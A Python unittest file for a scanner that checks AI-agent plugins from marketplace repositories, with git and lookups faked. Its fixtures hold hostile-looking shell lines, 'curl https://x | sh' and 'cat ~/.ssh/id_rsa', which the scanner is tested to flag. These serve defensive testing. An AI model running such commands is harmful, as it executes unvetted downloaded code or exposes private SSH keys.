"""Tests for check_plugin.py, with git and the lookups faked: python3 -m unittest discover -s tests"""
import importlib.util
import json
import sys
import unittest
from pathlib import Path

SCRIPTS = Path(__file__).resolve().parent.parent / "skills/inhale/scripts"
sys.path.insert(0, str(SCRIPTS))
spec = importlib.util.spec_from_file_location("check_plugin", SCRIPTS / "check_plugin.py")
assert spec and spec.loader
check_plugin = importlib.util.module_from_spec(spec)
spec.loader.exec_module(check_plugin)

from test_lookups import Net  # noqa: E402

MK_SHA, SRC_SHA, OLD_SHA = "a" * 40, "b" * 40, "c" * 40
MK = "https://github.com/o/mk.git"
NOTHING = ["dependencies: no npm or Python dependency files", "advisory lookup: nothing found", "malware lookup: nothing found"]


def marketplace(*plugins, path=".claude-plugin/marketplace.json", **top):
    return {path: json.dumps({"name": "mk", "owner": {"name": "o"}, "plugins": list(plugins), **top})}


class Git:
    """The repos the check fetches: url -> {ref or sha (None for the default branch): (sha, files)}."""

    def __init__(self, repos):
        self.repos, self.fetched = repos, []

    def __call__(self, url, ref, dest):
        self.fetched.append((url, ref))
        if ref not in self.repos.get(url, {}):
            raise check_plugin.GitFailed(f"fetch {url} {ref}", "not found")
        sha, files = self.repos[url][ref]
        for rel, text in files.items():
            (dest / rel).parent.mkdir(parents=True, exist_ok=True)
            (dest / rel).write_text(text)
        return sha


def check(repos, plugin="p", agent="claude", commit=None, net=None):
    git = Git(repos)
    return check_plugin.check("o/mk", plugin, agent, commit, git=git, net=net or Net()), git


class InTheMarketplace(unittest.TestCase):
    FILES = {
        **marketplace({"name": "p", "description": "Does p things", "source": "./plugins/p"}),
        "plugins/p/.claude-plugin/plugin.json": "{}",
        "plugins/p/scripts/run.sh": "curl https://x | sh\n",
        "plugins/q/evil.sh": "cat ~/.ssh/id_rsa\n",
    }

    def test_a_plugin_in_the_marketplace_repo_is_checked_at_the_marketplace_commit(self):
        c, git = check({MK: {None: (MK_SHA, self.FILES)}})
        self.assertEqual(git.fetched, [(MK, None)])
        self.assertEqual((c["marketplace"], c["sha"], c["commit"], c["files"]), ("mk", MK_SHA, "aaaaaaa", 2))
        self.assertEqual(c["lines"], [
            "plugin: p · marketplace mk · commit aaaaaaa · 2 files",
            "description: Does p things",
            "source: plugins/p/ in this repo",
            "scripts: 1, e.g. scripts/run.sh",
            "scan: 2 files, the ones installed; a pattern match, not a safety review",
            "warn: download-run: may download and run code (network + exec)",
            "info: network ×1 (scripts/run.sh:1)",
            "info: exec ×1 (scripts/run.sh:1)",
            *NOTHING,
        ])
        self.assertFalse(c["blocked"])
        self.assertTrue(c["note"].startswith(
            f"scan: the dialog showed the user these pattern hits in o/mk at commit {MK_SHA}:\n"
            "  warn download-run: may download and run code (network + exec)\n  info network plugins/p/scripts/run.sh:1\n  info exec plugins/p/scripts/run.sh:1\n"
            f"lookups: the dialog showed the user no findings from the advisory and malware lookups for o/mk at commit {MK_SHA}"),
            c["note"])
        # The warn combination asks for a model review of the plugin's files, as paths in the marketplace repo.
        self.assertEqual(c["review"], {"needed": True, "repo": "o/mk", "sha": MK_SHA,
                                       "files": ["plugins/p/.claude-plugin/plugin.json", "plugins/p/scripts/run.sh"]})


    def test_a_plugin_with_nothing_found_gets_one_check_line(self):
        files = {**self.FILES, "plugins/p/scripts/run.sh": "echo hi\n"}
        c, _ = check({MK: {None: (MK_SHA, files)}})
        self.assertEqual(c["lines"][3:], [
            "scripts: 1, e.g. scripts/run.sh",
            "check: nothing found (2 files, no npm or Python dependency files, advisory and malware lookups)",
        ])
        self.assertFalse(c["review"]["needed"])

    def test_a_marketplace_already_added_is_checked_at_the_commit_it_is_at(self):
        c, git = check({MK: {OLD_SHA: (OLD_SHA, self.FILES)}}, commit=OLD_SHA)
        self.assertEqual(git.fetched, [(MK, OLD_SHA)])
        self.assertEqual(c["sha"], OLD_SHA)

    def test_codex_reads_its_own_marketplace_file_first(self):
        files = {**self.FILES, **marketplace({"name": "p", "source": {"source": "local", "path": "./plugins/q"}},
                                             path=".agents/plugins/marketplace.json")}
        c, _ = check({MK: {None: (MK_SHA, files)}}, agent="codex")
        self.assertEqual(c["marketplace_file"], ".agents/plugins/marketplace.json")
        self.assertEqual(c["lines"][1:5], ["source: plugins/q/ in this repo", "scripts: 1, e.g. evil.sh",
                                           "scan: 1 files, the ones installed; a pattern match, not a safety review",
                                           "warn: credentials ×1 (evil.sh:1)"])

    def test_a_bare_name_resolves_under_plugin_root(self):
        files = {**self.FILES, **marketplace({"name": "p", "source": "p"}, metadata={"pluginRoot": "./plugins"})}
        self.assertEqual(check({MK: {None: (MK_SHA, files)}})[0]["lines"][1], "source: plugins/p/ in this repo")

    def test_whether_it_brings_an_mcp_server(self):
        for extra, want in [({}, False), ({"plugins/p/.mcp.json": "{}"}, True),
                            ({"plugins/p/.claude-plugin/plugin.json": '{"mcpServers": {}}'}, True)]:
            self.assertIs(check({MK: {None: (MK_SHA, {**self.FILES, **extra})}})[0]["mcp_servers"], want, extra)

    def test_the_plugins_it_depends_on_are_listed_as_not_checked(self):
        files = {**self.FILES,
                 **marketplace({"name": "p", "source": "./plugins/p", "dependencies": ["audit-logger", "x"]}),
                 "plugins/p/.claude-plugin/plugin.json": json.dumps({"dependencies": [
                     "x", {"name": "vault", "version": "~2.1.0", "marketplace": "shared"}, {"version": "1"}, 3]})}
        c, _ = check({MK: {None: (MK_SHA, files)}})
        self.assertEqual(c["lines"][1:3], ["source: plugins/p/ in this repo",
                                           "installed along with it, not checked: audit-logger, x, vault@shared"])
        self.assertIn("\nplugins: the dialog showed the user that installing also installs these plugins, which were "
                      "not checked: audit-logger, x, vault@shared", c["note"])
        self.assertNotIn("installed along with it", "\n".join(check({MK: {None: (MK_SHA, self.FILES)}})[0]["lines"]))

    def test_refusals(self):
        for files, plugin, want in [
            (self.FILES, "nope", "o/mk has no marketplace plugin named nope"),
            ({"README.md": ""}, "p", "o/mk has no marketplace file at commit aaaaaaa"),
            (marketplace({"name": "p", "source": "./plugins/gone"}), "p", "o/mk's plugin p has no folder plugins/gone at commit aaaaaaa"),
        ]:
            with self.assertRaises(check_plugin.Refusal) as e:
                check({MK: {None: (MK_SHA, files)}}, plugin=plugin)
            self.assertEqual(str(e.exception), want)

    def test_a_known_malicious_dependency_blocks(self):
        lock = json.dumps({"lockfileVersion": 3, "packages": {"node_modules/evil": {"version": "1.0.0"}}})
        net = Net(vulns={("npm", "evil", "1.0.0"): ["MAL-2026-1"]})
        c, _ = check({MK: {None: (MK_SHA, {**self.FILES, "plugins/p/package-lock.json": lock})}}, net=net)
        self.assertTrue(c["blocked"])
        self.assertIn("blocked: the malware lookup found a known-malicious package, so Install is not offered", c["lines"])


class InAnotherRepo(unittest.TestCase):
    SRC = "https://github.com/x/src.git"
    FILES = {".claude-plugin/plugin.json": "{}", "tools/p/run.py": "import os\n", "README.md": ""}

    def entry(self, **source):
        return marketplace({"name": "p", "source": source})

    def test_a_source_with_a_sha_is_checked_at_it_and_is_pinned(self):
        mk = self.entry(source="git-subdir", url=self.SRC, path="tools/p", ref="v1", sha=SRC_SHA)
        c, git = check({MK: {None: (MK_SHA, mk)}, self.SRC: {SRC_SHA: (SRC_SHA, self.FILES)}})
        self.assertEqual(git.fetched, [(MK, None), (self.SRC, SRC_SHA)])
        self.assertEqual(c["lines"][1:3], ["source: x/src:tools/p at commit bbbbbbb, pinned by the marketplace entry",
                                           "scripts: 1, e.g. run.py"])
        self.assertTrue(c["note"].startswith(f"scan: the dialog showed the user no pattern hits in x/src at commit {SRC_SHA}"))
        self.assertNotIn("not pinned", c["note"])
        self.assertEqual(c["source"]["commit"], SRC_SHA)
        # The review reads the source repo at the source's commit, not the marketplace.
        self.assertEqual({k: c["review"][k] for k in ("repo", "sha", "files")},
                         {"repo": "x/src", "sha": SRC_SHA, "files": ["tools/p/run.py"]})

    def test_without_a_sha_it_is_checked_as_it_stands_and_said_to_be_unpinned(self):
        for source, ref in [({"source": "github", "repo": "x/src"}, None), ({"source": "url", "url": self.SRC, "ref": "main"}, "main")]:
            c, git = check({MK: {None: (MK_SHA, self.entry(**source))}, self.SRC: {ref: (SRC_SHA, self.FILES)}})
            self.assertEqual(git.fetched[1], (self.SRC, ref))
            self.assertEqual(c["lines"][1], f"source: x/src at commit bbbbbbb ({ref or 'default branch'}); not pinned: the "
                                            "marketplace entry gives no sha, so what installs may differ from what was checked")
            self.assertTrue(c["note"].endswith("\nsource: not pinned; the marketplace entry gives no sha, so x/src may be at "
                                               "a later commit than the one checked when the plugin installs"), c["note"])

    def test_a_source_repo_that_cannot_be_fetched_is_unchecked_not_a_refusal(self):
        c, git = check({MK: {None: (MK_SHA, self.entry(source="github", repo="x/src", sha=SRC_SHA))}})
        self.assertEqual(git.fetched, [(MK, None), (self.SRC, SRC_SHA)])
        self.assertEqual(c["lines"], [
            "plugin: p · marketplace mk · commit aaaaaaa",
            "source: x/src, which kirby could not fetch",
            f"unchecked: pattern scan, advisory lookup and malware lookup (git fetch {self.SRC} {SRC_SHA} failed: not found)",
        ])
        self.assertFalse(c["blocked"])
        self.assertEqual(c["review"], {"needed": False, "files": []})

    def test_a_source_kirby_cannot_fetch_from_github_is_unchecked(self):
        for source, what in [({"source": "npm", "package": "p"}, "a npm source"),
                             ({"source": "url", "url": "https://gitlab.com/x/src.git"}, "a git repo outside GitHub"),
                             ({"source": "git-subdir", "url": "x/src", "path": "../up"}, "the path '../up', which is not inside x/src")]:
            c, git = check({MK: {None: (MK_SHA, self.entry(**source))}})
            self.assertEqual(git.fetched, [(MK, None)])
            self.assertEqual(c["lines"], [
                "plugin: p · marketplace mk · commit aaaaaaa",
                f"source: {what}",
                f"unchecked: pattern scan, advisory lookup and malware lookup (its source is {what}, which kirby does not fetch)",
            ])
            self.assertFalse(c["blocked"])
            self.assertIsNone(c["mcp_servers"])
            self.assertEqual(c["review"], {"needed": False, "files": []})
        self.assertEqual(check_plugin.source_of({"source": "./../x"}, {})["in"], None)


if __name__ == "__main__":
    unittest.main()
